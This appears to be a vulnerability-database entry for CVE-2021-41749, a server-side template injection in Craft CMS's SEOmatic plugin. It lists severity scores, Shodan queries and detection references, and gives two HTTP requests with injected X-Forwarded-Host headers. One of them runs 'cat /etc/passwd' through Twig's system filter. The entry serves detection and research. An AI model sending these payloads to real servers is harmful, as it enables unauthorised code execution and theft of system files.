---
layout: "post"
cve_id: "CVE-2021-41749"
title: "CraftCMS SEOmatic - Server-Side Template Injection"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-41749.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41749.yaml"
author: "iamnoooob,ritikchaddha"
severity: "critical"
reference:
  - "https://github.com/nystudio107/craft-seomatic/commit/3fee7d50147cdf3f999cfc1e04cbc3fb3d9f2f7d"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-41749"
  - "https://github.com/nystudio107/craft-seomatic/blob/develop/CHANGELOG.md"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2021-41749"
  cwe-id: "CWE-94"
  epss-score: 0.85815
  epss-percentile: 0.99338
  cpe: "cpe:2.3:a:nystudio107:seomatic:*:*:*:*:*:craft_cms:*:*"
metadata:
  verified: True
  max-request: 2
  vendor: "nystudio107"
  product: "seomatic"
  framework: "craft_cms"
  shodan-query: ['X-Powered-By: Craft CMS html:"SEOmatic"', 'x-powered-by: craft cms', 'x-powered-by: craft cms html:"seomatic"']
tags:
  - "cve2021"
  - "cve"
  - "craftcms"
  - "cms"
  - "ssti"
  - "nystudio107"
  - "craft_cms"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
In the SEOmatic plugin up to 3.4.11 for Craft CMS 3, it is possible for unauthenticated attackers to perform a Server-Side. Template Injection, allowing for remote code execution.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Connection: close
Cache-Control: max-age=0
X-Forwarded-Host: www.victim.com/malicious\{\{43825*44683\}\}
Accept-Encoding: gzip
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.8
Connection: close
Cache-Control: max-age=0
X-Forwarded-Host: xxx\{\{['cat /etc/passwd']|filter('system')\}\}bbb
Accept-Encoding: gzip
```


